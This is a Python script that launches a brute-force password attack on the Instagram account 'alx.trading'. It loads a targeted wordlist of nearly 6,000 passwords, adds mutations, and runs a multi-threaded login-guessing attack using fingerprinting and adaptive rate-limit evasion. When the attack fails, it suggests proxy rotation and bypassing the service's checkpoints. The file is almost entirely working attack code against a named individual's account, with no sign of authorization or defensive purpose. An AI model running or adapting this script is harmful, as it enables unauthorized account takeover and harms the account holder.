#!/usr/bin/env python3
"""
COMPREHENSIVE OPTION 1 ATTACK
Enhanced wordlist + smart generation + mutations for alx.trading
Uses the 5,994 targeted passwords plus mutations
"""

import sys
import os
sys.path.append('/workspaces/sugarglitch-realops/scripts')

try:
    from bruteforce_ig import AdvancedInstagramBruteForcer, load_enhanced_password_list

    print("💀 COMPREHENSIVE OPTION 1 ATTACK")
    print("🎯 Target: alx.trading")
    print("📋 Enhanced wordlist (5,994 passwords) + mutations")
    print("=" * 60)

    # Load enhanced password list with mutations
    print("📋 Loading enhanced password list...")
    passwords = load_enhanced_password_list(
        "/workspaces/sugarglitch-realops/passwords.txt",
        "alx.trading"
    )

    print(f"✅ Total passwords loaded: {len(passwords):,}")

    # Create brute forcer with enhanced settings
    print("🚀 Initializing advanced brute forcer...")
    brute_forcer = AdvancedInstagramBruteForcer(
        target_username="alx.trading",
        password_list=passwords,
        proxy_list=None,  # No proxies to avoid IPv6 issues
        use_tor=False
    )

    # Generate additional mutations
    print("🔀 Generating additional mutations...")
    mutations = brute_forcer.generate_mutation_passwords(
        passwords[:500])  # Top 500
    enhanced_passwords = list(set(passwords + mutations))
    brute_forcer.password_list = enhanced_passwords

    print(f"💪 Enhanced password arsenal: {len(enhanced_passwords):,}")
    print(f"🔄 Session pool: {len(brute_forcer.sessions)} sessions")

    # Show sample passwords
    print("\n🔍 Sample passwords to try:")
    sample_passwords = enhanced_passwords[:15]
    for i, pwd in enumerate(sample_passwords, 1):
        print(f"   {i:2d}. {pwd}")

    print("\n💀 STARTING COMPREHENSIVE OPTION 1 ATTACK")
    print("⚙️  Configuration:")
    print("   📋 Enhanced wordlist + mutations")
    print("   🧵 5 threads (controlled)")
    print("   🌐 No proxies (stability)")
    print("   🧠 Smart mode enabled")
    print("   🎭 Advanced fingerprinting")
    print("   ⏱️  Adaptive rate limiting")

    input("\n⚠️  Press ENTER to start the enhanced attack...")

    # Start the comprehensive attack
    success = brute_forcer.hardcore_brute_force_attack(
        max_threads=5,     # Conservative thread count
        smart_mode=True    # Smart password ordering
    )

    # Results summary
    print("\n📊 COMPREHENSIVE ATTACK RESULTS:")
    print(f"🎯 Target: alx.trading")
    print(f"📋 Total passwords tested: {len(enhanced_passwords):,}")
    print(f"✅ Success: {brute_forcer.success_count}")
    print(f"❌ Failed: {brute_forcer.failed_count}")
    print(f"🔒 Checkpoints: {brute_forcer.checkpoint_count}")
    print(f"⏳ Rate limits: {brute_forcer.rate_limit_count}")

    if success:
        print(f"\n🎉 SUCCESS! Password found: {brute_forcer.found_password}")
        print("📁 Success details saved in logs/")
    else:
        print(f"\n💔 No password found in this session")
        print("💡 Consider:")
        print("   - Trying different timing")
        print("   - Using proxy rotation")
        print("   - Manual checkpoint bypass")

    # Export results
    results = brute_forcer.export_results('option1_comprehensive_results.json')
    print(f"\n📁 Comprehensive results exported to results/")

except Exception as e:
    print(f"❌ Error in comprehensive attack: {e}")
    import traceback
    traceback.print_exc()
